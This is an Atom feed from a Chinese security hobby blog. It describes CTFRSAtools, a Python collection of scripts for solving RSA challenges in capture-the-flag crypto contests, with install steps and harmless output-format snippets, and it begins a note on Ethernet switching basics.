<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://imfanqie.top</id>
    <title>imFanqie</title>
    <link href="http://imfanqie.top" />
    <updated>2022-05-25T08:05:21.163Z</updated>
    <category term="随笔" />
    <category term="debug" />
    <category term="ICT" />
    <category term="反序列化" />
    <category term="业余爱好" />
    <category term="文件包含" />
    <category term="sql" />
    <category term="RCE" />
    <category term="命令执行" />
    <category term="http" />
    <category term="代码审计" />
    <category term="SSTI" />
    <category term="upload" />
    <category term="SSRF" />
    <category term="php" />
    <category term="python" />
    <entry>
        <id>http://imfanqie.top/2022/05/25/program/py/pysolve/CTFRSAtools/</id>
        <title>CTFRSAtools</title>
        <link rel="alternate" href="http://imfanqie.top/2022/05/25/program/py/pysolve/CTFRSAtools/"/>
        <content type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;项目：CTFRSAtools&lt;/p&gt;
&lt;p&gt;作者：Fanqie&lt;/p&gt;
&lt;p&gt;最后时间：2022.05.25&lt;/p&gt;
&lt;hr&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;本文及文中代码未经允许禁止私自转载或使用！&lt;/p&gt;
&lt;/div&gt;
&lt;h2 id=&#34;摘要&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#摘要&#34;&gt;#&lt;/a&gt; 摘要&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;该工具定位于 CTF 比赛中 Crypto 方向中 RSA 类型题目的自动判断、分析与解题。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CTFRSAtools (下文简称 CRts) 支持脚本扩充，可以将比赛中遇到的其他脚本及时补充至 CRtss 工具中。事实上，CRts 只是作为一个 RSA 脚本容器存在，并集成了部分 CTFCrypto 中 rsa 题型常见工具，您可以通过自行添加、补充甚至更改脚本的方式自定义 CRts。本工具已经加入了常见题型的脚本近 20 个，可以满足大部分比赛的基础格式 RSA 类型题目，如果您需要扩充脚本，请注意脚本的格式需参照其他脚本文件。脚本的扩容会在下文详细介绍。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CRts 没有加入 segamath 脚本，因此像有限域开方、CopperSmith 明文高位攻击、Franklin-Reiter 攻击、多项式等类型的题目，还请师傅手撸吧。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CRts 支持公钥分解、文件解密，具体使用方法见下文。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用说明、其他问题及帮助详见下文。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;结构与思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#结构与思路&#34;&gt;#&lt;/a&gt; 结构与思路&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;CRts 结构&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;CTFRSAtools
/example	# data.txt案例
	--略
/RSAtools	# 脚本储存、调用
	--略
--banner.py
--main.py
--RSAjudge.py	# 在此处添加识别信息

附
data.txt	# 题目数据
flag.enc	# 解密文件
pub.key		# 公钥文件
readme.md	# 文件说明
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;设计思路：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​		CRts 作为一个解题容器，采用脚本和判断分离的方式，可以最大化保障工具的自定义能力。&lt;/p&gt;
&lt;p&gt;​		CRts 采用 data.txt 方式读取数据而非命令行输入，可以保障数据的反复可阅且容易修改检查。&lt;/p&gt;
&lt;p&gt;​		CRts 需要 python3 版本的支持，搭建的版本为 python3.8，使用时请注意库的安装。&lt;/p&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;h2 id=&#34;功能与注意&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#功能与注意&#34;&gt;#&lt;/a&gt; 功能与注意&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;功能：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 功能会随着版本的更新不断增改，以CRts实际运行效果为准。
# 每次比赛后都可能会添加脚本，若有新的想法，可以联系作者加入github项目组共同开发
# 功能示例见&amp;lt;使用与测试&amp;gt;

+ 标准类型的RSA题型互解(详略)
+ 基与factordb.com和yafu的大数分解
+ dp泄露攻击
+ dp、dq泄露攻击
+ 共模攻击
+ 低解密指数攻击(e较大)
+ 维纳攻击
+ 公钥分解
+ 文件解密

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;由于分解 N 时会用到 factordb，故需要连接网络；若无网络连接，将使用 yafu 分解，在面临大数时效率可能过低。您也可以自行在 factordb.com 或 yafu 分解后，写入 data.txt。&lt;/li&gt;
&lt;li&gt;segamath 暂时没有配备到 CRts 中，故 sega 类脚本无法加入脚本集。&lt;/li&gt;
&lt;li&gt;有些功能可能不完善，为了避免不必要的错误，请尽量确保 data.txt 中的每个值都是有用的。&lt;/li&gt;
&lt;li&gt;在使用该工具时，应当有一定的 RSA 基础，在解题时如果有 bug，可以根据分析调整甲苯，并请及时反馈。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;下载与安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载与安装&#34;&gt;#&lt;/a&gt; 下载与安装&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;下载：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CRts 暂未开源（还在不断的完善脚本，等效果很好了再放出，目前只能解简单题）&lt;/p&gt;
&lt;p&gt;CRts 已托管至 github，有兴趣的师傅可以联系作者，协同开发。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安装：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. git clone 或 download 

2. 安装python3 （有请略）

3. pip install gmpy2

4. pip install Crypto

5. pip install RSA

6. pip install numpy

7. 缺啥库补啥。。。

8. 运行测试
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;安装中有问题请参考百度（3、4 等）&lt;/p&gt;
&lt;p&gt;预期在开源后发布 exe 版本（注：exe 版本可能无法自定义脚本）&lt;/p&gt;
&lt;h2 id=&#34;使用与测试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用与测试&#34;&gt;#&lt;/a&gt; 使用与测试&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;使用说明：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用前请确保数据已在 CRts 根目录中写入 data.txt 或存入 pub.key/flag.enc 文件&lt;/li&gt;
&lt;li&gt;打开 cmd 或 powershell，cd 至 CRts 根目录&lt;/li&gt;
&lt;li&gt;&lt;code&gt;python main.py&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;脚本自动运行后，等待结果返回即可，若无结果或有 bug，请与作者联系&lt;/li&gt;
&lt;li&gt;请调用完成后及时清除 data.txt、pub.key、flag.enc 文件，以便下一次使用&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;测试示例：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;示例选取的题目数据均来自于 CTFshow 与 buuCTF&lt;/p&gt;
&lt;p&gt;以下展示示例为乱序，与功能顺序无关。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;lt;!--p--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/05/25/b9b5225684d4f0a1c1dab39aa492ae6f.png&#34; alt=&#34;b9b5225684d4f0a1c1dab39aa492ae6f.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/05/25/7e02342279d2641abc7bc54c92c9ed6a.png&#34; alt=&#34;7e02342279d2641abc7bc54c92c9ed6a.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/05/25/ec274f31481dfed3a503fe11eed37614.png&#34; alt=&#34;ec274f31481dfed3a503fe11eed37614.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/05/25/61ffc40146d6d83dee5511fbfa97d945.png&#34; alt=&#34;61ffc40146d6d83dee5511fbfa97d945.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/05/25/52ceae63a122db7c49ca637cc0f0549c.png&#34; alt=&#34;52ceae63a122db7c49ca637cc0f0549c.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/05/25/54aab50011f3a9d9bc9d5b0bb818f8aa.png&#34; alt=&#34;54aab50011f3a9d9bc9d5b0bb818f8aa.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/05/25/e734dd9a4caf01462a617b0af59cdeec.png&#34; alt=&#34;e734dd9a4caf01462a617b0af59cdeec.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/05/25/48e37229d386fa9425615eab652fc3ca.png&#34; alt=&#34;48e37229d386fa9425615eab652fc3ca.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/05/25/37c0ded11a20d6dbd7febafb3720d782.png&#34; alt=&#34;37c0ded11a20d6dbd7febafb3720d782.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;自定义扩展&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自定义扩展&#34;&gt;#&lt;/a&gt; 自定义扩展&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;使用该方法时请确保您对 RSA 类型题目有一定的了解，并且已经参考过 RSAtools 中的其他脚本。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果您需要自定义脚本（删除修改以及添加），您可以参考以下部分。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;请提前查看 RSAtools 中的其他脚本：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;这里以大多数文件的格式举例：&lt;br&gt;
solves () 函数将作为解决问题的基本接口函数，以便于被其他脚本调用&lt;br&gt;
 printf () 函数作为打印值函数，调用 solves () 进行计算，并返回于屏幕&lt;/li&gt;
&lt;li&gt;调用其他脚本的格式为  &lt;code&gt;from RSAtools import xxxxx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;若计算结果为 d，可以参考如下格式：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    d &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; solves&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;=&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;99&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;int_d：&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;=&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;99&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
&lt;li&gt;若计算结果为 m，可以参考如下格式：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;z&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	m &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; solves&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;z&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;=&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;99&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;int：&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;hex：&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;int：&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;hex to ascii：&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;binascii&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;unhexlify&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;libnum(n2s)：&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libnum&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;n2s&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;just hex or int &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;=&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;99&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;根据格式写好新脚本后，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1SU0FqdWRnZS04dDFtNDRyODhidDBidTkwZXBpMmE0bGYucHk=&#34;&gt;将判断条件加入 RSAjudge.py&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在 fun_call () 函数中，您能看到所有的方法调用，当您补充脚本时，也可以加入该函数以便使用。&lt;/li&gt;
&lt;li&gt;在 judge (RSAdata) 函数中，你可以根据 print 和注释得出数据分类情况，将您的脚本加入相应的类别中即可。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;如果您有新的元素要定义，例如 r、x、y、z 等 可以参考 main.py 中的写法另赋值即可。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;版本及更新&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#版本及更新&#34;&gt;#&lt;/a&gt; 版本及更新&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;版本日志&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;名称&lt;/th&gt;
&lt;th&gt;版本&lt;/th&gt;
&lt;th&gt;日期&lt;/th&gt;
&lt;th&gt;日志 and 备注&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;CTFRSAtools&lt;/td&gt;
&lt;td&gt;beta 0.1&lt;/td&gt;
&lt;td&gt;2022.5.24&lt;/td&gt;
&lt;td&gt;基带版本，后续更新时间看情况&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;计划目标&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加入 sega 脚本&lt;/li&gt;
&lt;li&gt;扩充 RSA 解题范围，加入其它类型题目求解法&lt;/li&gt;
&lt;li&gt;整合其它密码类型，扩展 tools 应用范围，如：base 家族，进制转换，编码转换，md5 定向爆破等&lt;/li&gt;
&lt;li&gt;待定……&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;结尾&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#结尾&#34;&gt;#&lt;/a&gt; 结尾&lt;/h2&gt;
&lt;p&gt;本文档基于初代版本而写，因更新原因，可能会与实际产品有所差异，本说明仅供参考。&lt;/p&gt;
&lt;p&gt;该项目仅供学习和比赛使用，未经允许禁止私自传播分享！&lt;/p&gt;
&lt;p&gt;同时欢迎其他师傅加入开发共同完善，项目库未公开，项目地址请联系作者。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;作者：Fanqie&lt;/p&gt;
&lt;p&gt;联系方式：q/v 2740908911&lt;/p&gt;
&lt;/blockquote&gt;
</content>
        <category term="python" />
        <updated>2022-05-25T08:05:21.163Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2022/02/28/ICT/Datacom%E7%AC%94%E8%AE%B0/ICT%E7%AC%94%E8%AE%B0-%E4%BB%A5%E5%A4%AA%E7%BD%91%E4%BA%A4%E6%8D%A2%E5%9F%BA%E7%A1%80/</id>
        <title>ICT笔记-以太网交换基础</title>
        <link rel="alternate" href="http://imfanqie.top/2022/02/28/ICT/Datacom%E7%AC%94%E8%AE%B0/ICT%E7%AC%94%E8%AE%B0-%E4%BB%A5%E5%A4%AA%E7%BD%91%E4%BA%A4%E6%8D%A2%E5%9F%BA%E7%A1%80/"/>
        <content type="html">&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;以太网协议介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#以太网协议介绍&#34;&gt;#&lt;/a&gt; 以太网协议介绍&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;以太网协议&lt;/strong&gt;：以太网是当今现有局域网采用的最通用的通信协议标准，定义了局域网中采用的电缆类型和信号处理方法。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/b91dbfbfa2014bd0b231fc0631022e49.png&#34; alt=&#34;b91dbfbfa2014bd0b231fc0631022e49.png&#34;&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;冲突域&lt;/strong&gt;：连接在同一共享介质上的所有节点的集合。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;广播域&lt;/strong&gt;：广播报文所能达到的整个访问范围成为二层广播域，简称广播域。&lt;/p&gt;
